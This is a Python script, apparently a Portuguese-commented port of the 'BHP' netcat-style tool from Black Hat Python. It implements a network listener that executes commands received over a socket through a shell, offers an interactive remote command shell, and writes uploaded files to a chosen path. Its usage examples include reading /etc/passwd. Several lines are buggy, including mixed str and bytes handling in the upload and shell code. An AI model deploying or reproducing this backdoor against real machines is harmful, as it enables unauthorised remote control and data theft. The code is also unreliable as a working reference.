#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Sep 28 13:16:23 2019

@author: max
"""

import sys
import socket
import getopt
import threading
import subprocess

# Define algumas variáveis globais
listen             = False
command            = False
upload             = False
execute            = ''
target             = ''
upload_destination = ''
port               = 0

def usage():
    print('BHP Tool')
    print('')
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for incomming connections')
    print('-e --execute=file_to_run - execute execute the given file upon receiving a connection')
    print('-c --command             - intializa a command shell')
    print('-u --upload=destination  - upon receiving connection upload a file write to [destination]')
    print('')
    print('')
    print('Examples:')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/paswd\"')
    print('echo \'ABCDEFGHI\' |  ./bhpnet.py -t 192.168.11.12 -p 135')
    sys.exit(0)
    
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Conecta ao nossso host alvo
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer.encode('UTF-8'))
            
        while True:
            
            # Agora espera receber dados de volta
            recv_len = 1
            response = ''
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('UTF-8')
                
                if recv_len <4096:
                    break
                
            print(response)
            
            # Espera mais dados de entrada
            buffer = input('')
            buffer += '\n'
            
            # Envia os dados
            client.send(buffer.encode('UTF-8'))
            
    except:
        print('[*] Exception in client_sender! Exiting.')
            
        # Encerra a conexão
        client.close()
            
def server_loop():
    global target
    
    # Se não estiver alvo definido, ouviremos todas as interfaces
    if not len(target):
        target = '0.0.0.0'
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        # Dispara thread para cuidar do novo cliente
        client_thrread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thrread.start()
        
def run_command(command):
    
    # Remove quebra de linha
    command = command.rstrip()
    
    # Executa ccomando e obtém os dados de saída
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command.\r\n'
        
    # Envia dados da saída de volta ao cliente
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    
    # Verifica se há upload
    if len(upload_destination):
        
        # Lê todos os bytes e grava em nosso destino
        file_buffer = ''
        
        # Permanece lendo os dados até que não haja maiss nenhum disponível
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer += data.decode('UTF-8')
                
        # Agora tentaremos gravar esses bytes
        try:
            file_descriptor = open(upload_destination,'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()
        except:
            client_socket.send('Failedd to save file to\r\n'.encode('UTF-8'))
            
    # Verifica se há comando
    if len(execute):
        
        # Executa o comando
        output = run_command(execute)
        
        client_socket.send(output.encode('UTF-8'))
        
    # Entra em outro laço se um shell de commando foi solicitado
    if command:
        while True:
            # Mostra um prompt simples
            client_socket.send('<BHP:#>'.encode('UTF-8'))
                
            # Agora ficamos recebendo dados até vermos um linefeed (tecla enter)
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('UTF-8')
                    
            # Envia de volta a saida do coomando
            response = run_command(cmd_buffer)
                
            # Envia de volta a resposta
            client_socket.send(response)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    # Lê as opções da linha de comando
    try:
        opts, args = getopt.getopt(sys.argv[1:],'hle:t:p:cu:',['help','listen','execute','target','port','command','upload'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        
    for o, a in opts:
        if o in('-h','--help'):
            usage()
        elif o in ('-l','--listen'):
            listen = True
        elif o in ('-e','--execute'):
            execute = a
        elif o in ('-c','--commandshell'):
            command = True
        elif o in ('-u','--upload'):
            upload_destination = a
        elif o in ('-t','--target'):
            target = a
        elif o in ('-p','--port'):
            port = int(a)
        else:
            pass
            
    # Iremos ouvir ou simplismente eenviar dados de stdin?
    if not listen and len(target) and port > 0:
        
        # Lê o buffer da linha de comando
        # isto causará um bloqueio, portanto envie um CTRL+D se não estiver
        # enviando dados de entrada para stdin
        buffer = sys.stdin.read()
        
        # Send data off
        client_sender(buffer)
        
    # Iremos ouvir a porta e, potencialmente
    # faremos upload de dados, executaremos comandos e deixaremos um shell
    # de acordo com as opções daa linha de comando anteriores
    if listen:
        server_loop()
        
main()
        
        